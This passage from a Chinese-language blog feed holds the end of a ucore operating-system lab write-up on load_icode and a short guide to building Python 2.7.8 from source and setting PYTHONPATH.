class="hljs-comment">//返回</span><br>bad_cleanup_mmap:<br>    exit_mmap(mm);<br>bad_elf_cleanup_pgdir:<br>    put_pgdir(mm);<br>bad_pgdir_cleanup_mm:<br>    mm_destroy(mm);<br>bad_mm:<br>    goto out;<br>}</code></pre><br><p>load_icode主要是将文件加载到内存中执行，根据注释的提示分为了一共七个步骤：</p><br><pre><code>1、建立内存管理器<br>2、建立页目录<br>3、将文件逐个段加载到内存中，这里要注意设置虚拟地址与物理地址之间的映射<br>4、建立相应的虚拟内存映射表<br>5、建立并初始化用户堆栈<br>6、处理用户栈中传入的参数<br>7、最后很关键的一步是设置用户进程的中断帧<br></code></pre><br><h1 id="实验结果">实验结果</h1><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170707102143669?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h2 id="实验心得">实验心得</h2><br><p>本次实验让我重新认识了文件系统的管理，其中第二个小是一个大综合，结合了前面的物理内存，虚拟内存，进程，文件操作系统，用户栈···，做过之后感觉对以前知识的掌握更加的牢固。但同时我对于文件用户的权限管理不是太了解，接下来会进一步学习。</p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;练习0 填写已有实验将已完成的lab7和lab8进行对比  需要修改的文件如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.csche.cmonitor.check_sync.c练习1 完成读文件操作的实现  首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolo&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="操作系统实验" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>Python 2.7.8 手动安装 &amp; Python 环境变量添加</title>
    <link href="http://yoursite.com/2017/06/06/Python%202.7.8%20%E6%89%8B%E5%8A%A8%E5%AE%89%E8%A3%85%20&amp;%20Python%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B7%BB%E5%8A%A0/"/>
    <id>http://yoursite.com/2017/06/06/Python 2.7.8 手动安装 &amp; Python 环境变量添加/</id>
    <published>2017-06-06T11:29:00.000Z</published>
    <updated>2017-10-22T02:14:29.623Z</updated>
    
    <content type="html"><![CDATA[<p>Python 2.7.8 手动安装 &amp; Python 环境变量添加<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><h1 id="0x01-python-278-手动安装">0x01 Python 2.7.8 手动安装</h1><br><h2 id="0x1-源码">0x1 源码</h2><br><p><code><a href="https://www.python.org/download/releases/2.7.8" target="_blank" rel="external">https://www.python.org/download/releases/2.7.8</a></code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170606191630640?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>倒数第2个<br><br></p><br><h2 id="0x2-解压">0x2 解压</h2><br><p><code>xz -d Python-2.7.6.tar.xz</code> <br><br><code>tar xvf Python-2.7.6.tar</code><br></p><br><h2 id="0x3-编译">0x3 编译</h2><br><h3 id="1-执行configure脚本">(1) 执行configure脚本</h3><br><p><code>./configure</code></p><br><h3 id="2-编译源代码">(2) 编译源代码</h3><br><p><code>make</code></p><br><h3 id="3-安装编译好的软件">(3) 安装编译好的软件</h3><br><p><code>sudo make install</code></p><br><p>发现一直编译失败 此时必须删除以前的python文件 <br><br>分别存在<code>/usr/lib/python2.x or <br><br>/usr/local/lib/python2.x)<br></code> <br><br>上述步骤只是完成了python的安装但 没有设置python环境变量 ，导致pip安装的模块import无法找到。下面介绍一下环境变量的添加<br><br></p><br><h1 id="0x02-python-环境变量添加">0x02 Python 环境变量添加</h1><br><p>当import 模块的时候python会便利寻找 sys.path 下的内容 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170606192803669?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>因此如果要想自己的模块直接可以import 需要添加python环境变量<br><br></p><br><h3 id="1-永久添加-当前用户">(1) 永久添加 （当前用户）</h3><br><p>在用户主目录下有一个 .bashrc 隐藏文件，可以在此文件中加入 PATH 的设置如下： <br><br><code>vim ~/.bashrc</code> <br><br>添加 <br><br><code>export PYTHONPATH=/usr/local/lib/python2.7/dist-packages:$PYTHONPATH</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170606192417211?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br><code>source ~/.bashrc</code><br><br><br><br><br></p><br><h3 id="2-永久添加-所有用户">(2) 永久添加 （所有用户）</h3><br><p><code>vim  /etc/profile</code> <br><br><code>export PYTHONPATH=/usr/local/lib/python2.7/dist-packages:$PYTHONPATH</code> <br><br>需重启才能生效<br><br></p><br><h3 id="2-临时添加">(2) 临时添加</h3><br><p>当前终端下输入 <br><br><code>export PYTHONPATH=/usr/local/lib/python2.7/dist-packages:$PYTHONPATH</code><br></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python 2.7.8 手动安装 &amp;amp; Python 环境变量添加&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件及应用配置" scheme="http://yoursite.com/tags/%E8%BD%AF%E4%BB%B6%E5%8F%8A%E5%BA%94%E7%94%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
</feed>
